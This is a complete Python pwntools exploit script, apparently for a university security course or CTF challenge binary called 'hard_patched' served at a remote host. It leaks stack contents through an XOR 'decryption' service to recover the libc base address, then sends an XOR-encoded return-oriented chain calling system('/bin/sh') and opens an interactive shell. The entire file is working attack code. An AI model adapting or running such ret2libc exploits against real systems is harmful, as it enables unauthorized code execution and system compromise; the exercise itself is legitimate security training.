#!/usr/bin/env python3
from pwn import *

exe = ELF("./hard_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
INDEX_NUMBER = b"438596"
DIFFICULTY_LEVEL = {
    "EASY": b"3",
    "MEDIUM": b"2",
    "HARD": b"1",
}

# Offsets
# np. "gdb /lib/x86_64-linux-gnu/libc.so.6" i polecenie "p/x &system"
SYSTEM_OFF = 0x55230
# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
BIN_SH_OFF = 0x1c041b
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'
POP_RDI_OFF = 0x28715  # pop rdi ; ret


def bytes_xor(b1, b2):
    result = b""
    for b1, b2 in zip(b1, b2):
        result += bytes([b1 ^ b2])
    return result


def send_index_and_difficulty(r):
    r.sendline(INDEX_NUMBER)
    r.sendline(DIFFICULTY_LEVEL["HARD"])


def send_data_buff(r):
    r.sendline(b"8")
    r.sendline(8 * b"A")


def print_recv_stack(recv, mess_len):
    for i in range(0, mess_len, 8):
        print(hex(u64(recv[i:i + 8])))


def conn():
    # number of response messages like "how long is the data" etc.
    response_msgs_len = 5
    if args.LOCAL:
        r = process([exe.path, INDEX_NUMBER])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("bsk.bonus.re", 13337)
        send_index_and_difficulty(r)
        # additional welcome messages
        response_msgs_len += 9

    # stage 1: get bytes for xor and leak libc
    send_data_buff(r)
    mess_len = 14 * 8
    r.sendline(str(mess_len).encode())
    r.sendline(b"\0" * mess_len)

    # ignore all the messages but the "decrypted data" one
    for _ in range(response_msgs_len):
        __ = r.recvline()
    recv = r.recvn(mess_len)

    if args.VERBOSE:
        print_recv_stack(recv, mess_len)

    libc_base = u64(recv[(13 * 8):]) - 0x280D0

    if args.VERBOSE:
        print("libc=" + hex(libc_base))
        print("ret=" + hex(libc_base + POP_RDI_OFF + 1))
        print("pop_rdi=" + hex(libc_base + POP_RDI_OFF))
        print("binsh=" + hex(libc_base + BIN_SH_OFF))
        print("system=" + hex(libc_base + SYSTEM_OFF))

    # stage 2: send rop chain
    send_data_buff(r)
    mess_len = 104
    r.sendline(str(mess_len).encode())
    payload = 72 * b"\0" + bytes_xor(
        p64(libc_base + POP_RDI_OFF + 1) +
        p64(libc_base + POP_RDI_OFF) +
        p64(libc_base + BIN_SH_OFF) +
        p64(libc_base + SYSTEM_OFF),
        recv[72: mess_len])
    r.sendline(payload)

    return r


def main():
    r = conn()
    r.interactive()


if __name__ == "__main__":
    main()
